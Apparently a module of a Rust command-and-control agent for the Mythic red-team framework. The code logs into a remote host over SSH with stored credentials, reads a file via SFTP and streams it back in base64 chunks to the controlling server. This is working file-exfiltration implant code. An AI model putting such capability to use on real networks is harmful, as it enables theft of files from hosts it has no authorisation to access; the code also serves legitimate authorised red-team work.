use serde::Serialize;
use serde_json::json;

use crate::{AgentTask, ContinuedData};
use crate::mythic_success;
use base64::{Engine as _, engine::general_purpose};

use std::error::Error;
use std::io::{Cursor, Read};
use std::result::Result;
use std::sync::mpsc;

use super::{SshArgs, SshSession};

const CHUNK_SIZE: usize = 512000;

#[derive(Serialize)]
struct SshDownloadResponse<'a> {
    total_chunks: usize,
    full_path: Option<&'a str>,
    host: &'a str,
    filename: Option<String>,
    is_screenshot: bool,
    chunk_size: usize,
}

#[derive(Serialize)]
struct SshDownloadChunk<'a> {
    chunk_num: usize,
    file_id: &'a str,
    chunk_data: String,
    chunk_size: usize,
}

pub fn download_file(
    sess: &SshSession,
    task: &AgentTask,
    args: &SshArgs,
    tx: &mpsc::Sender<serde_json::Value>,
    rx: mpsc::Receiver<serde_json::Value>,
) -> Result<serde_json::Value, Box<dyn Error>> {
    let file_path = args.download.as_ref().unwrap();

    let file_data = sess.sftp_read(file_path)?;
    let file_len = file_data.len();
    let total_chunks = ((file_len as f64 / CHUNK_SIZE as f64).ceil()) as usize;

    let download_data = SshDownloadResponse {
        total_chunks,
        full_path: Some(file_path),
        host: &args.host,
        is_screenshot: false,
        chunk_size: CHUNK_SIZE,
        filename: None,
    };

    tx.send(json!({
        "task_id": task.id,
        "download": download_data,
    }))?;

    let mut c = Cursor::new(file_data);

    let task: AgentTask = serde_json::from_value(rx.recv()?)?;
    let params: ContinuedData = serde_json::from_str(&task.parameters)?;
    let file_id = params
        .file_id
        .ok_or_else(|| std::io::Error::other("No file id"))?;

    for num in 0..total_chunks {
        let mut buffer: [u8; CHUNK_SIZE] = [0; CHUNK_SIZE];
        let len = c.read(&mut buffer)?;

        let chunk_data = general_purpose::STANDARD.encode(&buffer[..len]);

        let chunk_metadata = SshDownloadChunk {
            chunk_num: num + 1,
            chunk_size: len,
            file_id: &file_id,
            chunk_data,
        };

        tx.send(json!({
            "task_id": task.id,
            "download": chunk_metadata
        }))?;

        let _: AgentTask = serde_json::from_value(rx.recv()?)?;
    }

    let mut output = mythic_success!(task.id, file_id);
    let output = output.as_object_mut().unwrap();
    output.insert(
        "artifacts".to_string(),
        serde_json::json!([
            {
                "base_artifact": "Remote FileOpen",
                "artifact": format!("ssh {}@{} -download {}", args.credentials.account, args.host, file_path),
            }
        ]),
    );

    Ok(serde_json::to_value(output)?)
}
